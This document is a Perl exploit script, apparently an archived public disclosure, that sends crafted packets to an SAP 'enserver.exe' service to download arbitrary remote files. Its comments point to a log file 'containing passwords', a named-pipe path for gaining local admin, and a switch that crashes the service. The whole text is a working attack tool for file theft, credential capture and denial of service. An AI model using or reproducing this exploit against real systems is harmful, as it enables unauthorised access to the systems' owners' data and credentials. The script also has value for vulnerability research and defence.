#!/usr/bin/perl -w

##
## SAP 'enserver.exe' file downloader
## Tested on "SAP Web Application Server Java 6.40" (eval DVD)
## Found & coded by Nicob
##
## The downloaded file is limited to the first 32 kilobytes
## Usual port : TCP/3200+SYSNR
## Exemple : ./r3-stealer-1.0.pl 192.168.2.22 3201 "c:\\boot.ini"
##
## From MSDN (Win2K pre-SP4, WinXP pre-SP2 and WinNT) :
## "\\\\your_box\\pipe\\your_pipe" => get Local Admin (SAPServiceJ2E)
## http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secauthz/security/authorization_constants.asp
##
## File parameter :
##	C:\boot.ini
## 	\\10.11.12.13\share\image.jpg
##	..\..\..\..\..\..\Documents and Settings\All Users\Application Data\sapdb\wa\httpreq.log (contains passwords !)
##

# Init

use strict;
use IO::Socket;

my $verbose = 0;
# Set this to anything not null to crash the process
my $crash = "";

my $socket;
my $reply;

$|=1;

# Get arguments

if (($#ARGV<2) or ($ARGV[0] eq "-h")) {die "Usage: $0 <ip> <port> <remote filename> (<local filename>)\n";}
my $host=$ARGV[0]; 
my $port=$ARGV[1]; 
my $filename=$ARGV[2]; 
my $output=$ARGV[3]; 

# Calculate variables

my $lg = length($filename);
my $tag1 = sprintf('%x', 0x4F + $lg);
my $tag2 = sprintf('%x', 0x20 + $lg);

# Show banner

print "#####################################################################\n";
print "### SAP 'enserver.exe' file downloader\n";
print "### Downloading '$filename' from '$host'\n";
print "#####################################################################\n\n";

# Define the packets

my $packet1 =
	"0000005dabcde123000000000000005d0000005d06010000000000060000000000040000000000010004000000000003".	# Static
	"5f6e69636f625f6e69636f625f6e69636f62315f".								# ASCII string : "_nicob_nicob_nicob1_" 
	"00000000020000003b0000000500000002000000060000000400000001";						# Static

my $packet2 =
	"000000". $tag1. "abcde12300000001000000". $tag1 ."000000". $tag1 .
	"03000000454e430001010000234541410100000013030000000000234541450001000000". $tag2 .
	"0000000000007d00000000000000000000000000". unpack("H*",$filename) . $crash ."000023454144";		# Crash if bad filename length

# Create the socket

$socket = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>$host,PeerPort => $port)
		|| die "Connection refused at [$host:$port]";

# Send the two packet

print $socket pack("H*",$packet1);
print $socket pack("H*",$packet2);

sleep 2;

# Read and display response

recv($socket,$reply,150000,MSG_PEEK);
if ($reply =~ /^(.*)#EAD(.*)$/s) {
	print "File received !\n";
	if ((!defined($output)) or ($output eq "")) {
		print "\n===========================================\n";
		print $2;
		print "\n===========================================\n";
	} else {
		open(OUT, "> $output") || die "Can't open $output ($0)";
		print "File saved as '$output'\n";
		print OUT $2;
		close(OUT);
	}
} else {
	print "Problem interpreting reply :-(\n";
}

# Close the socket

print "\nThe end ...\n";
close $socket;

# milw0rm.com [2007-02-08]
